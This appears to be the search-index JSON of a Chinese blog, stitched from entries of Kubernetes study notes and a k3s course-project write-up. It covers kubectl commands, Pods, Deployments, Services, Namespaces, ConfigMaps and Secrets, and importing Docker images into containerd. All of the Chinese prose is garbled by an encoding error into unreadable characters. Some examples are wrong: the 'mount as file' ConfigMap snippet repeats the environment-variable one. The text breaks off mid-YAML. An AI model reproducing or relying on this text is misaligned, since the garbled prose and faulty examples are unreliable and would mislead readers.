æ­¤dockeræŒ‡çš„æ˜¯k8séƒ¨ç½²çš„æ—¶å€™ç”¨çš„dockerï¼Œæœ¬åœ°æ²¡æœ‰è¿™ä¸ªé—®é¢˜ï¼Œå¯èƒ½æ˜¯orbçš„åŠŸåŠ³ï¼Ÿ åœ¨docker build -t frontend:latest .åï¼Œä½ æ‹¥æœ‰äº†æœ¬åœ°é•œåƒï¼Œè¿™ä¸ªæ—¶å€™ä½ ä¹Ÿè®¸ä¼šè¿è¡Œkubectl apply -f **.yamlï¼Œç„¶åkubectl get podï¼Œç„¶åå°±å‘ç°ä¼šé•œåƒé”™è¯¯ï¼ŒåŸå› æ˜¯k8så’Œdockerç”¨çš„è™½ç„¶éƒ½æ˜¯containerdï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥åˆ©ç”¨ï¼ ä½ éœ€è¦ docker save frontend:latest -o frontend.tar docker load -i frontend.tar ctr -n k8s.io images import frontend.tar //æ¨é€åˆ°containerd è¿™æ ·æ‰å¯ä»¥ä½¿ç”¨æœ¬åœ°çš„ éƒ¨ç½²é—®é¢˜ éƒ¨ç½²å…¶å®åœ¨ç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œä¸ºä»€ä¹ˆæˆ‘è¿˜æ˜¯é…ç½®äº†ä¸€æ™šä¸Šå‘¢ï¼Ÿ ç¬¬ä¸€å¼€å§‹å¹¶æ²¡æœ‰è¯¦ç»†çš„çœ‹æ•™ç¨‹ï¼Œç›´æ¥aptå¯åŠ¨åŠ ä¸Šä¸ªäººæƒ³è±¡åŠ›äº†ï¼Œå‘ç°ç¯å¢ƒç‚¸äº†çš„æ—¶å€™å·²ç»æ•‘ä¸å›æ¥äº†ï¼Œæ‰€ä»¥åé¢å¸¦ç€dockeræ•´ä¸ªå¸è½½é‡è£…äº† æœ€åé€‰æ‹©äº†k3sï¼Œæ›´åŠ è½»é‡åŒ–ï¼Œä¹Ÿæ›´å¥½é…ç½®(2c2gçš„æœåŠ¡å™¨æè¿™ç§ä¸œè¥¿çœŸæœ‰ç‚¹éš¾)ã€‚ ä½†æ˜¯é—®é¢˜ä¾æ—§å¾ˆå¤šï¼Œæ¯”å¦‚k3sçš„é•œåƒé—®é¢˜ï¼ŒDNSè½¬å‘éƒ½è½¬å‘ä¸äº†çš„ï¼Œæˆ‘é€‰æ‹©äº†å…¨éƒ¨pullåˆ°æœ¬åœ°ï¼Œç„¶åæ‰“åŒ…æˆtarä¼ ä¸Šå»ï¼Œè™½ç„¶å¾ˆæ…¢ï¼Œä½†æ˜¯å¾ˆç¨³ã€‚ ä¸ºä»€ä¹ˆä¸æ¢æºå‘¢ï¼Ÿæˆ‘æ˜¯çœŸçš„æ²¡æœ‰æ‰¾åˆ°å¯ä»¥ç”¨çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘å¯ä»¥ç”¨çš„dockeræºæ‹‰åˆ°k3sé‡Œé¢éƒ½çƒ‚äº†ï¼Œä¸‹æ¬¡å¯ä»¥è¯•è¯•æä¸ªé•œåƒç«™å§ã€‚ ","date":"2025-06-11","objectID":"/yjsks/:1:10","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"å…³äºå®‰è£… macçš„è¯å¯ä»¥ç›´æ¥orbä¸€æŠŠæ¢­äº†ï¼Œé‡Œé¢ç›´æ¥å¯åŠ¨å³å¯ï¼Œå¦‚æœä¸æƒ³çš„è¯ï¼Œå°±ç›´æ¥å»çœ‹å®˜æ–¹å®‰è£…æ–¹æ³•æˆ‘æ„Ÿè§‰ä¸å¦‚orbï¼Œlinuxå’Œwinåªèƒ½å®‰è£…å®˜æ–¹çš„æ¥å’¯ ","date":"2025-06-09","objectID":"/study-k8s/:1:0","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"å¸¸ç”¨å‘½ä»¤ ","date":"2025-06-09","objectID":"/study-k8s/:2:0","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"åŸºç¡€ä¿¡æ¯æŸ¥çœ‹å‘½ä»¤ å‘½ä»¤ ä½œç”¨ kubectl version æŸ¥çœ‹å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ç‰ˆæœ¬ä¿¡æ¯ kubectl cluster-info æŸ¥çœ‹é›†ç¾¤çš„åŸºæœ¬ä¿¡æ¯ï¼ˆAPI Serverã€Dashboard ç­‰ï¼‰ kubectl get nodes æŸ¥çœ‹é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ kubectl describe node \u003cèŠ‚ç‚¹å\u003e æŸ¥çœ‹æŸä¸ªèŠ‚ç‚¹çš„è¯¦ç»†ä¿¡æ¯ kubectl get all æŸ¥çœ‹å½“å‰å‘½åç©ºé—´ä¸‹æ‰€æœ‰èµ„æº ","date":"2025-06-09","objectID":"/study-k8s/:2:1","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Pod ç›¸å…³æ“ä½œ å‘½ä»¤ ä½œç”¨ kubectl get pods æŸ¥çœ‹æ‰€æœ‰ Pod kubectl get pods -o wide æŸ¥çœ‹ Pod çš„è¯¦ç»†ä¿¡æ¯ï¼ˆåŒ…å« IPã€èŠ‚ç‚¹ï¼‰ kubectl describe pod \u003cpodå\u003e æŸ¥çœ‹æŸä¸ª Pod çš„è¯¦ç»†ä¿¡æ¯ kubectl logs \u003cpodå\u003e æŸ¥çœ‹ Pod çš„æ—¥å¿—è¾“å‡º kubectl exec -it \u003cpodå\u003e -- /bin/bash è¿›å…¥å®¹å™¨å†…éƒ¨ï¼ˆéœ€è¦å®¹å™¨ä¸­æœ‰ bashï¼‰ kubectl delete pod \u003cpodå\u003e åˆ é™¤æŒ‡å®š Pod ","date":"2025-06-09","objectID":"/study-k8s/:2:2","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Deploymentã€Service ç­‰èµ„æºæ“ä½œ å‘½ä»¤ ä½œç”¨ kubectl get deployment æŸ¥çœ‹ Deployment kubectl describe deployment \u003cåå­—\u003e æŸ¥çœ‹ Deployment è¯¦ç»†ä¿¡æ¯ kubectl apply -f \u003cyamlæ–‡ä»¶\u003e åº”ç”¨ YAML æ–‡ä»¶ï¼Œåˆ›å»º/æ›´æ–°èµ„æº kubectl delete -f \u003cyamlæ–‡ä»¶\u003e åˆ é™¤ YAML æ–‡ä»¶å®šä¹‰çš„èµ„æº kubectl scale deployment \u003cåå­—\u003e --replicas=\u003cæ•°é‡\u003e æ‰©ç¼©å®¹ Deployment çš„å‰¯æœ¬æ•° kubectl rollout restart deployment \u003cåå­—\u003e é‡å¯ Deploymentï¼ˆä¼šæ»šåŠ¨æ›´æ–° Podï¼‰ kubectl rollout status deployment \u003cåå­—\u003e æŸ¥çœ‹ Deployment çš„æ»šåŠ¨æ›´æ–°çŠ¶æ€ kubectl expose deployment \u003cåå­—\u003e --type=NodePort --port=80 æš´éœ² Deployment ä¸ºæœåŠ¡ ","date":"2025-06-09","objectID":"/study-k8s/:2:3","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"å‘½åç©ºé—´ Namespace ç®¡ç† å‘½ä»¤ ä½œç”¨ kubectl get namespaces æŸ¥çœ‹æ‰€æœ‰å‘½åç©ºé—´ kubectl create namespace \u003cåç§°\u003e åˆ›å»ºæ–°çš„å‘½åç©ºé—´ kubectl delete namespace \u003cåç§°\u003e åˆ é™¤å‘½åç©ºé—´ kubectl get pods -n \u003cnamespace\u003e æŸ¥çœ‹æŒ‡å®šå‘½åç©ºé—´ä¸‹çš„ Pod kubectl config set-context --current --namespace=\u003cåç§°\u003e è®¾ç½®é»˜è®¤å‘½åç©ºé—´ ","date":"2025-06-09","objectID":"/study-k8s/:2:4","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"é…ç½®ç®¡ç†ï¼ˆConfigMap \u0026 Secretï¼‰ å‘½ä»¤ ä½œç”¨ kubectl create configmap \u003cåç§°\u003e --from-literal=key=value åˆ›å»º ConfigMapï¼ˆä»å­—é¢å€¼ï¼‰ kubectl create configmap \u003cåç§°\u003e --from-file=\u003cæ–‡ä»¶è·¯å¾„\u003e åˆ›å»º ConfigMapï¼ˆä»æ–‡ä»¶ï¼‰ kubectl get configmap æŸ¥çœ‹ ConfigMap kubectl describe configmap \u003cåç§°\u003e æŸ¥çœ‹ ConfigMap è¯¦æƒ… kubectl create secret generic \u003cåç§°\u003e --from-literal=key=value åˆ›å»º Secret kubectl get secret æŸ¥çœ‹ Secret kubectl describe secret \u003cåç§°\u003e æŸ¥çœ‹ Secret è¯¦æƒ…ï¼ˆæ•°æ®ä¸º base64 ç¼–ç ï¼‰ ","date":"2025-06-09","objectID":"/study-k8s/:2:5","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"èµ„æºæ¸…ç†ä¸è°ƒè¯• å‘½ä»¤ ä½œç”¨ kubectl delete pod --all åˆ é™¤å½“å‰å‘½åç©ºé—´ä¸‹çš„æ‰€æœ‰ Pod kubectl get events æŸ¥çœ‹äº‹ä»¶æ—¥å¿—ï¼Œæ’æŸ¥é—®é¢˜ kubectl top pod æŸ¥çœ‹ Pod çš„ CPU å’Œå†…å­˜ä½¿ç”¨æƒ…å†µï¼ˆéœ€è¦å®‰è£… Metrics Serverï¼‰ kubectl cp \u003cpodå\u003e:\u003cå®¹å™¨è·¯å¾„\u003e \u003cæœ¬åœ°è·¯å¾„\u003e ä»å®¹å™¨ä¸­æ‹·è´æ–‡ä»¶åˆ°æœ¬åœ° kubectl debug \u003cpodå\u003e ä½¿ç”¨ä¸´æ—¶å®¹å™¨è°ƒè¯•ï¼ˆ1.18+ ç‰ˆæœ¬æ”¯æŒï¼‰ ","date":"2025-06-09","objectID":"/study-k8s/:2:6","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"è¿›é˜¶å‘½ä»¤å’Œè¡¥å…… å‘½ä»¤ ä½œç”¨ kubectl edit \u003cèµ„æºç±»å‹\u003e \u003cåç§°\u003e ä½¿ç”¨ç¼–è¾‘å™¨ä¿®æ”¹èµ„æºå®šä¹‰ kubectl explain \u003cèµ„æº\u003e æŸ¥çœ‹èµ„æºå­—æ®µçš„æ–‡æ¡£è¯´æ˜ kubectl api-resources æŸ¥çœ‹é›†ç¾¤æ”¯æŒçš„ API èµ„æºç±»å‹ kubectl get \u003cèµ„æº\u003e -A æŸ¥çœ‹æ‰€æœ‰å‘½åç©ºé—´çš„èµ„æºï¼ˆå¦‚ -A è¡¨ç¤º all namespacesï¼‰ ","date":"2025-06-09","objectID":"/study-k8s/:2:7","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Pod\u0026Deployment\u0026Service ","date":"2025-06-09","objectID":"/study-k8s/:3:0","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Pod æ˜¯Kubernetesä¸­æœ€å°çš„å¯è°ƒåº¦å•å…ƒï¼Œè¡¨ç¤ºè¿è¡Œä¸­çš„çš„ä¸€ä¸ªorå¤šä¸ªå®¹å™¨ï¼Œæ¯”å¦‚ kubectl get pods NAME READY STATUS RESTARTS AGE redis-c479dfb5-wcj8g 1/1 Running 0 45h yunjisuan-backend-5fbbd85dd8-kkqq7 1/1 Running 0 43h yunjisuan-frontend-56fd559cbd-gjf2b 1/1 Running 0 43h æˆ‘çš„è§†è§’é‡ŒæŠŠä»–å½“ä½œä¸€ä¸ªå®¹å™¨çš„è½½ä½“ï¼Œä¸€èˆ¬æ˜¯ä¸€å¯¹ä¸€çš„å…³ç³»ï¼Œè€Œä¸”å½“è¿™ä¸ªpodæŒ‚æ‰äº†ï¼Œä»–æ˜¯ä¸ä¼šè‡ªåŠ¨é‡å»ºçš„ï¼Œéœ€è¦ç”¨Deploymentå»å¯åŠ¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå®˜æ–¹ä¸ä¼šè®©ä½ ç›´æ¥åˆ›å»ºpodçš„åŸå› ï¼Ÿ ","date":"2025-06-09","objectID":"/study-k8s/:3:1","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Deployment æ˜¯ä¸€ç§æ§åˆ¶å™¨ï¼Œç”¨äºç®¡ç† Pod çš„å‰¯æœ¬ã€å‰¯æœ¬æ•°é‡ã€å‡çº§ã€å›æ»šç­‰ï¼Œæ¯”å¦‚ kubectl get deployments NAME READY UP-TO-DATE AVAILABLE AGE redis 1/1 1 1 45h yunjisuan-backend 1/1 1 1 43h yunjisuan-frontend 1/1 1 1 43h åœ¨æˆ‘è§†è§’é‡Œä»–æ˜¯podçš„ç®¡ç†è€…ï¼Œå¹¶ä¸”å¯ä»¥è‡ªåŠ¨é‡æ–°åˆ›å»ºè¿è¡Œå¤±è´¥çš„podï¼Œå…·å¤‡é«˜å¯ç”¨å’Œå¯æ‰©å±•æ€§ã€‚Deployment å°±åƒæ˜¯ Pod çš„è°ƒåº¦ä¸ç”Ÿå‘½å‘¨æœŸæ§åˆ¶å™¨ ","date":"2025-06-09","objectID":"/study-k8s/:3:2","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Podä¸Deploymentçš„å…³ç³» å¯èƒ½ä¼šæ³¨æ„åˆ° kubectl get deployments kubectl get pods è¿™ä¸¤æ¡æŒ‡ä»¤çš„è¾“å‡ºå†…å®¹æ˜¯å·®ä¸å¤šçš„ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ çœ‹ä¸€ä¸ªå±‚çº§ç»“æ„å›¾å§ Deployment â””â”€â”€ ReplicaSetï¼ˆè‡ªåŠ¨ç®¡ç†ï¼‰ â””â”€â”€ Podï¼ˆå®é™…è¿è¡Œï¼‰ Deployment æ˜¯â€œå®£è¨€å¼é…ç½®â€ï¼šä½ è¯´æˆ‘éœ€è¦ 1 ä¸ª nginx æœåŠ¡ï¼Œå®ƒå°±å¸®ä½ åˆ›å»ºå’Œç»´æŒå®ƒã€‚ ReplicaSet æ˜¯ç”± Deployment è‡ªåŠ¨åˆ›å»ºçš„å‰¯æœ¬æ§åˆ¶å™¨ï¼Œä¸éœ€è¦ä½ å…³å¿ƒã€‚ Pod æ˜¯æœ€ç»ˆç”± ReplicaSet å®é™…è¿è¡Œçš„å®¹å™¨å•å…ƒã€‚ é‚£æˆ‘ç›®å‰åœ¨ä¸€ä¸ªDeploymentä¸‹åªåˆ›å»ºäº†ä¸€ä¸ªpodï¼Œkubectl get deploymentsæ˜¾ç¤ºçš„æ˜¯éƒ¨ç½²æƒ…å†µï¼Œkubectl get podsæ˜¾ç¤ºçš„æ˜¯çœŸå®è¿è¡Œçš„å®¹å™¨å®ä¾‹ï¼Œæ‰€ä»¥ç›¸ä¼¼æ˜¯åˆç†çš„ï¼Œå¹¶ä¸”å¯ä»¥å‘ç°ï¼Œpodåœ¨åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªéšæœºå­—ç¬¦ä¸²çš„åç¼€ ","date":"2025-06-09","objectID":"/study-k8s/:3:3","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Service Pod æ˜¯ä¼šæ¶ˆå¤±å’Œå˜åŒ–çš„ï¼ˆæ¯”å¦‚è¢«é‡æ–°è°ƒåº¦ã€é‡å¯ç­‰ï¼‰ï¼Œè€Œå®ƒä»¬çš„ IP åœ°å€ä¹Ÿæ˜¯ ä¸å›ºå®šçš„ã€‚ æ‰€ä»¥ä¸ºäº†è®©å¤–éƒ¨è®¿é—®ã€æˆ–å†…éƒ¨æœåŠ¡é—´é€šä¿¡èƒ½æ‰¾åˆ° Podã€è´Ÿè½½å‡è¡¡ã€è‡ªåŠ¨å‘ç°ï¼Œå°±éœ€è¦ä¸€ä¸ªâ€œä¸­é—´å±‚â€æ¥è´Ÿè´£è¿™ä¸ªäº‹ï¼Œé‚£å°±æ˜¯ï¼šservice ä¸ºä»€ä¹ˆéœ€è¦ Serviceï¼Ÿ é—®é¢˜ Service æ€ä¹ˆè§£å†³ Pod çš„ IP ä¸ç¨³å®šï¼Ÿ Service æä¾›ä¸€ä¸ªå›ºå®š IP å’Œ DNS åå­— æœ‰å¤šä¸ª Podï¼ˆå‰¯æœ¬ï¼‰ï¼Ÿ Service è‡ªåŠ¨åšè´Ÿè½½å‡è¡¡ ä¸åŒå‘½åç©ºé—´ã€æœåŠ¡é—´éœ€è¦é€šä¿¡ï¼Ÿ Service è®©é€šä¿¡å˜å¾—å¯æ§å’Œå¯é…ç½® æƒ³æš´éœ²æœåŠ¡åˆ°é›†ç¾¤å¤–éƒ¨ï¼Ÿ Service å¯ä»¥æš´éœ²ç«¯å£ç»™å¤–éƒ¨è®¿é—® Service çš„ç±»å‹ ç±»å‹ è¯´æ˜ ç”¨é€” ClusterIPï¼ˆé»˜è®¤ï¼‰ åªåœ¨é›†ç¾¤å†…éƒ¨å¯è®¿é—® åç«¯æœåŠ¡é€šä¿¡ï¼ˆæ¯”å¦‚ï¼šå‰ç«¯è°ƒåç«¯ï¼‰ NodePort ç»‘å®šæ¯ä¸ª Node çš„æŸä¸ªç«¯å£ï¼Œå¯¹å¤–æš´éœ² å¤–éƒ¨è®¿é—®é›†ç¾¤ä¸­æœåŠ¡ LoadBalancer ç”±äº‘æœåŠ¡å•†åˆ†é…ä¸€ä¸ªè´Ÿè½½å‡è¡¡å™¨ IP ç”Ÿäº§ç¯å¢ƒå¸¸ç”¨ï¼Œé€‚åˆäº‘å¹³å° ExternalName æ˜ å°„åˆ°å¤–éƒ¨ DNS åç§° è®¿é—®å¤–éƒ¨æœåŠ¡ï¼ˆå¦‚æ•°æ®åº“ï¼‰ ä¸€èˆ¬éƒ¨ç½²æ˜¯é€šè¿‡ç¼–è¾‘æ–‡ä»¶å®ç°æ•ˆæœ å‡è®¾æœ‰ä¸ª Deployment apiVersion: apps/v1 kind: Deployment metadata: name: my-backend spec: replicas: 3 selector: matchLabels: app: my-backend template: metadata: labels: app: my-backend spec: containers: - name: app image: my-backend:latest ports: - containerPort: 8080 æˆ‘ä»¬ä¸ºå®ƒåˆ›å»ºä¸€ä¸ª Serviceå»ClusterIPï¼š apiVersion: v1 kind: Service metadata: name: my-backend-service spec: type: ClusterIP selector: app: my-backend ports: - port: 80 # Service æš´éœ²çš„ç«¯å£ targetPort: 8080 # å®¹å™¨å®é™…ç›‘å¬çš„ç«¯å£ å…¶ä»–çš„podå°±å¯ä»¥é€šè¿‡http://my-backend-service:80è®¿é—® ","date":"2025-06-09","objectID":"/study-k8s/:3:4","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Service \u0026 Pod çš„å…³è” Kubernetes ä¸­çš„ Pod ä¼šå¸¦æœ‰ labelsï¼ˆæ ‡ç­¾ï¼‰ï¼Œè€Œ Service ä¼šé€šè¿‡ selectorï¼ˆé€‰æ‹©å™¨ï¼‰æ¥é€‰ä¸­è¿™äº› Podï¼Œä¸¤è€…é€šè¿‡è¿™ä¸ªæœºåˆ¶äº§ç”Ÿå…³è”ï¼Œæ¯”å¦‚podçš„å®šä¹‰å¦‚ä¸‹ apiVersion: v1 kind: Pod metadata: name: my-backend-pod labels: app: my-backend tier: backend spec: containers: - name: backend image: my-backend:latest ports: - containerPort: 8080 ä½ å°±å¯ä»¥çœ‹è§labelsçš„å†…å®¹æ˜¯appå’Œtierï¼Œç„¶åæˆ‘ä»¬å®šä¹‰ä¸€ä¸ª Service apiVersion: v1 kind: Service metadata: name: my-backend-service spec: selector: app: my-backend ports: - port: 80 targetPort: 8080 åœ¨selectoré‡Œé¢æŒ‡å‘è¿™ä¸ªappï¼Œè¿™ä¸ªserverå°±ä¼šæ‰¾åˆ°æ‰€æœ‰å«è¿™ä¸ªæ ‡ç­¾çš„podï¼Œå¹¶ä¸”æ·»åŠ åˆ°Endpoints(è´Ÿè½½æ± )é‡Œé¢ã€‚ ç¤ºæ„å›¾ [ Service ] | â””â”€â”€ selector: app=xxx â†“ï¼ˆåŒ¹é…æ ‡ç­¾ï¼‰ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ Pod 1 â”‚ â† labels: app=xxx â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ Pod 2 â”‚ â† labels: app=xxx â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Service è‡ªåŠ¨è´Ÿè½½å‡è¡¡è®¿é—®è¿™ä¸¤ä¸ª Podï¼ ","date":"2025-06-09","objectID":"/study-k8s/:3:5","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Namespace Namespace æ˜¯ Kubernetes çš„é€»è¾‘éš”ç¦»æœºåˆ¶ï¼Œå¯ä»¥æŠŠåŒä¸€ä¸ªé›†ç¾¤åˆ’åˆ†æˆå¤šä¸ªâ€œè™šæ‹Ÿå­é›†ç¾¤â€ã€‚å°±åƒæ˜¯åœ¨ä¸€ä¸ªä¸œè¥¿é‡Œé¢åˆåˆ†äº†å¥½å‡ å—ï¼Œäº’ä¸å½±å“ï¼Œå„è‡ªç®¡ç†ã€‚ ","date":"2025-06-09","objectID":"/study-k8s/:4:0","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Namespace å’Œå“ªäº›ä¸œè¥¿æœ‰å…³ç³» èµ„æºå¯¹è±¡çš„ä½œç”¨åŸŸ å±äº Namespace çš„èµ„æº ç¤ºä¾‹ Pod / Deployment / StatefulSet / Job è¿è¡Œçš„å·¥ä½œè´Ÿè½½ Service / Ingress æœåŠ¡æš´éœ²æ–¹å¼ ConfigMap / Secret é…ç½®å’Œæ•æ„Ÿæ•°æ® PVCï¼ˆPersistentVolumeClaimï¼‰ å­˜å‚¨è¯·æ±‚ ServiceAccount / Role / RoleBinding æƒé™æ§åˆ¶ è®¿é—®æƒé™æ§åˆ¶ æ¯”å¦‚ kind: Role metadata: namespace: dev rules: - apiGroups: [\"\"] resources: [\"pods\"] verbs: [\"get\", \"list\", \"create\"] é…åˆ RoleBinding(ç»‘å®šç”¨æˆ·ç”¨çš„)ï¼Œå°±å¯ä»¥è®©æŸä¸ªç”¨æˆ·åªèƒ½æ“ä½œ dev å‘½åç©ºé—´é‡Œçš„ Pod èµ„æºé…é¢é™åˆ¶ Kubernetes æ”¯æŒå¯¹æ¯ä¸ªå‘½åç©ºé—´é™åˆ¶ CPUã€å†…å­˜ã€Pod æ•°é‡ç­‰èµ„æºï¼Œé˜²æ­¢â€œæŸä¸€æ–¹éœ¸å èµ„æºâ€ã€‚ apiVersion: v1 kind: ResourceQuota metadata: name: mem-cpu-limit namespace: dev spec: hard: requests.cpu: \"2\" requests.memory: 4Gi limits.cpu: \"4\" limits.memory: 8Gi è¿™æ ·å»è®¾ç½®ä¸Šé™ åå­—éš”ç¦» åŒä¸€ä¸ªåå­—åœ¨ä¸åŒçš„å‘½åç©ºé—´å†…æ˜¯å¯ä»¥é‡å¤çš„ kubectl get pods -n dev kubectl get pods -n prod DNS æœåŠ¡å‘ç° åŒåæœåŠ¡åœ¨ä¸åŒå‘½åç©ºé—´ä¸­æ˜¯ä¸ä¼šå†²çªçš„ æ¯”å¦‚http://my-service.default.svc.cluster.localçš„å®Œæ•´æ ¼å¼æ˜¯\u003cservice-name\u003e.\u003cnamespace\u003e.svc.cluster.local ","date":"2025-06-09","objectID":"/study-k8s/:4:1","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"ConfigMap \u0026 Secret åç§° ä½œç”¨ å†…å®¹ç±»å‹ å­˜å‚¨æ–¹å¼ ConfigMap å­˜å‚¨éæ•æ„Ÿé…ç½®ï¼ˆå¦‚ç¯å¢ƒå˜é‡ã€é…ç½®æ–‡ä»¶ï¼‰ æ™®é€šæ˜æ–‡ Base64 ç¼–ç ä½†ä¸åŠ å¯† Secret å­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å¯†ç ã€Tokenã€è¯ä¹¦ï¼‰ åŠ å¯†/ç¼–ç å†…å®¹ é»˜è®¤ Base64ï¼Œå¯é…åˆå¯†é’¥ç®¡ç†å™¨åŠ å¯†å­˜å‚¨ ","date":"2025-06-09","objectID":"/study-k8s/:5:0","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"ConfigMap ç¤ºä¾‹ å…ˆåˆ›å»ºä¸€ä¸ª apiVersion: v1 kind: ConfigMap metadata: name: my-config namespace: default data: APP_NAME: \"MyApp\" APP_ENV: \"dev\" CONFIG_JSON: | { \"logLevel\": \"debug\", \"maxConn\": 100 } åœ¨podä¸­ä½œä¸ºç¯å¢ƒå˜é‡ä½¿ç”¨ env: - name: APP_NAME valueFrom: configMapKeyRef: name: my-config key: APP_NAME åœ¨podä¸­æŒ‚è½½ä¸ºæ–‡ä»¶ä½¿ç”¨ env: - name: APP_NAME valueFrom: configMapKeyRef: name: my-config key: APP_NAME ","date":"2025-06-09","objectID":"/study-k8s/:5:1","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"Secret ç¤ºä¾‹ å…ˆåˆ›å»ºä¸€ä¸ª apiVersion: v1 kind: Secret metadata: name: my-secret namespace: default type: Opaque data: DB_PASSWORD: bXlwYXNzd29yZA== ä½œä¸ºç¯å¢ƒå˜é‡ä½¿ç”¨ env: - name: DB_PASSWORD valueFrom: secretKeyRef: name: my-secret key: DB_PASSWORD æŒ‚è½½ä¸ºæ–‡ä»¶ä½¿ç”¨ volumes: - name: secret-vol secret: secretName: my-secret volumeMounts: - name: secret-vol mountPath: \"/etc/secret\" ","date":"2025-06-09","objectID":"/study-k8s/:5:2","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"k8s\u0026docker ","date":"2025-06-09","objectID":"/study-k8s/:6:0","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"ç¼–å¹´å² åœ¨å¾ˆä¹…å¾ˆä¹…ä»¥å‰(v1.3 ï½ v1.19)ï¼Œk8sé»˜è®¤å¯åŠ¨podæ˜¯dockerï¼Œv1.20å¼€å§‹å®£å¸ƒå¼ƒç”¨ Dockershimï¼Œv1.24æ­£å¼å¼ƒç”¨Dockershim å¯ä»¥è®¤ä¸ºä»¥å‰çš„podå¯åŠ¨é¡ºåºæ˜¯ kubectl â†’ kubelet â†’ Dockershim â†’ Docker â†’ å®¹å™¨ åé¢k8sæ„Ÿè§‰è¿˜æ˜¯å¤ªé‡äº†ï¼Œå°±å¹²è„†åªç”¨è‡ªå·±çš„containerdäº† ","date":"2025-06-09","objectID":"/study-k8s/:6:1","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"å¦‚ä½•k8s+docker å‡å¦‚æˆ‘ç°åœ¨æœ‰ä¸€ä¸ªå†™å¥½çš„ä¸‰ç«¯é¡¹ç›®ï¼Œåç«¯/å‰ç«¯/å°ç¨‹åºï¼Œæˆ‘åˆ†åˆ«åŒ…äº†ä¸€ä¸ªdockerå»è¿è¡Œï¼Œæˆ‘ç°åœ¨æœ‰éœ€æ±‚å»å¤šèŠ‚ç‚¹åˆ†å¸ƒå¼éƒ¨ç½²ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ ç­”æ¡ˆå¾ˆç®€å•ï¼šk8sé‡Œé¢è·‘docker(è¿™æ ·æˆ‘å†™çš„dockerfileä¹Ÿä¸ä¼šæµªè´¹) å¦‚ä½•å®ç°è¿™ç§æ“ä½œå‘¢ï¼Ÿ é¦–å…ˆä½ è¦çŸ¥é“ï¼Œdockeré‡Œé¢ä¹Ÿæœ‰containerdï¼Œå“ï¼Œé‚£å®é™…ä¸ŠåŸç†ç›¸åŒï¼Œæˆ‘è®©k8sçš„containerdå»è·‘dockeré•œåƒçš„å†…å®¹è¿›è¡Œäº†ï¼Œå¦‚å›¾æ‰€ç¤º [ å¼€å‘è€… ] â†“ docker build [ æœ¬åœ°é•œåƒ ] â†“ docker push [ é•œåƒä»“åº“ï¼ˆå¦‚ Harbor / Docker Hubï¼‰ ] â†“ kubectl apply [ K8s æ§åˆ¶å™¨ ] â†“ è°ƒåº¦åˆ° Node [ kubelet ] â†“ container runtimeï¼ˆContainerdï¼‰ [ Pod ä¸­å®¹å™¨è¿è¡Œ ] è€Œå»è°ƒç”¨dockerå°±è¦ä¾èµ–.yamlæ–‡ä»¶çš„ç¼–å†™äº†ï¼Œå¦‚ docker build -t myapp:v1 . docker tag myapp:v1 registry.example.com/myapp:v1 docker push registry.example.com/myapp:v1 æˆ‘è¿™ä¸ªæ—¶å€™è¦åœ¨podé‡Œé¢å¼•ç”¨è¿™ä¸ªé•œåƒ containers: - 